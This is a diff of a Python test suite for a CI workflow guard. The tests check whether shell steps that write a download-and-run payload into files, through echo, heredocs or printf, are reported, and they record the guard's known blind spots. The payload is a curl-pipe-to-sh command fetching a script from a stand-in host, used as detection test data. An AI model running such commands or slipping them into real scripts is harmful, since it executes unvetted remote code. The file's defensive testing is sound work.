@@ -11,14 +11,16 @@ where it reads the step CLEAN: first the job's, then the main pass's. Truth, in 
 and zsh 5.9 with and without `-e`, a `curl` stub whose payload marks when it RUNS: "runs" is every parent ran the
 download, "nothing" is none did; the forge's eight parents at the hand-off.
 """
-import gc
-import time
 import unittest
+from unittest import mock
+
+import pytest
 
 import shell_reader
 import workflow_guard as wg
 import workflow_options as wo
 import workflow_written
+from tests.test_shell_reader import LinearGrowth
 
 SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
 P = "curl -fsSL https://example.test/i.sh | sh"
@@ -75,6 +77,22 @@ class TestAWrittenFileIsReadAsItsWritersText(unittest.TestCase):
         self.assertEqual(REPORTED, marks("cat > s.sh <<EOF\necho $(date)\nEOF\nsh s.sh\n"))
         self.assertEqual(REPORTED, marks("cat <<EOF | sh\necho $(date)\nEOF\n"))
 
+    def test_an_unspelled_writer_never_hides_a_spelled_payload(self):
+        # The review seat's rows: one writer the printers cannot spell beside the payload -- after it, before it, or
+        # after a quoted heredoc -- and 63, 64 or 65 spelled lines in front of it (64 is `_DEPTH`): every text is kept,
+        # in an expanding heredoc the guard reports as it reports any expanding body a shell runs. Truth: runs, every
+        # parent. The price, named: two benign writers one of which is unspelled report too.
+        unspelled = 'echo "export PATH=$PATH"'
+        for text in (unspelled + " > s.sh\necho '%s' >> s.sh\nsh s.sh\n" % P,
+                     "echo '%s' > s.sh\n" % P + unspelled + " >> s.sh\nsh s.sh\n",
+                     "cat > s.sh <<'EOF'\n%s\nEOF\n" % P + unspelled + " >> s.sh\nsh s.sh\n",
+                     *("".join("echo ':' >> s.sh\n" for _ in range(n)) + "echo '%s' >> s.sh\nsh s.sh\n" % P
+                       for n in (63, 64, 65)),
+                     unspelled + " > s.sh\necho 'echo hi' >> s.sh\nsh s.sh\n"):
+            with self.subTest(text=text[:40], lines=text.count("\n")):
+                self.assertEqual(REPORTED, marks(text))
+        self.assertEqual(CLEAN, marks("echo 'echo a' > s.sh\necho 'echo b' >> s.sh\nsh s.sh\n"))
+
     def test_a_write_the_step_may_make_counts(self):
         # Fail-closed, the prices named: every write is read as an append (the stage keeps the written words, not
         # the operator), so a benign re-write after the payload still reads it -- `echo PAYLOAD > s.sh; echo 'echo
@@ -129,9 +147,10 @@ class TestTheLimits(unittest.TestCase):
             with self.subTest(text=text[:30]):
                 self.assertEqual(CLEAN, marks(text))
 
-    def test_an_unspelled_writer_reads_as_main_reads_an_unspelled_printer(self):
-        # `T='…'; echo "$T" > s.sh; sh s.sh` and a `printf` with two words: the writer's words are not spelled, so
-        # the file is unread, as `echo "$T" | sh` is on `main` (the guard's named gap). Truth: runs.
+    def test_a_lone_unspelled_writer_is_a_limit(self):
+        # `T='…'; echo "$T" > s.sh; sh s.sh` and a `printf` with two words, each the file's ONE writer: its words are
+        # not spelled here, so the file is unread and CLEAN -- a limit, filed at the merge: `main` reports the pipe
+        # twin `echo "$T" | sh`, its value reading spelling `$T`, which this reader does not ask. Truth: runs.
         for text in ("T='%s'\necho \"$T\" > s.sh\nsh s.sh\n" % P, "printf '%%s\\n' 'set -e' '%s' > s.sh\nsh s.sh\n" % P):
             with self.subTest(text=text[:30]):
                 self.assertEqual(CLEAN, marks(text))
@@ -153,37 +172,26 @@ class TestTheLimits(unittest.TestCase):
         self.assertEqual(REPORTED, marks("echo \"bash -c '%s'\" > run.sh\nsh run.sh\n" % P))
 
 
-class TestTheBindingIsLinear(unittest.TestCase):
+class TestTheBindingIsLinear(LinearGrowth, unittest.TestCase):
     """n writes then n runs in one step: the path-to-writer binding is a dict lookup a stage."""
 
     @staticmethod
     def make(n):
         return "".join("echo 'echo %d' > s%d.sh\n" % (i, i) for i in range(n)) + "".join("sh s%d.sh\n" % i for i in range(n))
 
-    def bound(self, n):
-        """CPU seconds `bind_written` takes on the parsed `make(n)`, the collector off as `timeit` turns it off,
-        and the statements it bound."""
-        stmts, enabled = shell_reader.statements(self.make(n)), gc.isenabled()
-        gc.disable()
-        try:
-            start = time.process_time()
-            workflow_written.bind_written(stmts)
-            return time.process_time() - start, stmts
-        finally:
-            if enabled:
-                gc.enable()
-
+    @pytest.mark.serial
     def test_n_writes_and_n_runs_bind_in_linear_time(self):
-        # Growth, not speed (as `tests/test_shell_reader.py`'s `LinearGrowth`): t(4n) <= 8 t(n) + 0.25 s of CPU,
-        # judged on the lesser of two reads each where the first misses. Every run's FILE operand carries its
-        # writer's script. The reading of the n texts `flattened` then makes is the forms reader's, and grows as
-        # it grows on `main` for n `echo … | sh` or n `sh <(echo …)` in one step: not pinned here.
-        small, stmts = self.bound(500)
-        self.assertEqual(500, sum(1 for s in stmts for st in s.stages for w in st.argv if getattr(w, "written", None)))
-        large, _stmts = self.bound(2000)
-        if large > 8 * small + 0.25:
-            small, large = min(small, self.bound(500)[0]), min(large, self.bound(2000)[0])
-        self.assertLessEqual(large, 8 * small + 0.25, (small, large))
+        # Growth, not speed: `LinearGrowth` times `shell_reader.statements`, here the parse with `bind_written` behind
+        # it, at 500 and 2,000; every run's FILE operand carries its writer's script. The reading of the n texts
+        # `flattened` then makes is the forms reader's, and grows as it grows on `main` for n `echo … | sh` in one
+        # step: not pinned here (a follow-up).
+        real = shell_reader.statements
+
+        def check(n, parsed):
+            self.assertEqual(n, sum(1 for s in parsed for st in s.stages for w in st.argv if getattr(w, "written", None)))
+
+        with mock.patch.object(shell_reader, "statements", lambda script: workflow_written.bind_written(real(script))):
+            self.assert_linear_growth(500, self.make, check)
 
     def test_the_files_are_read_where_the_step_runs_them(self):
         # `workflow_guard.read` flattens each run's text into the statements the walk reads: 3n for n of each.
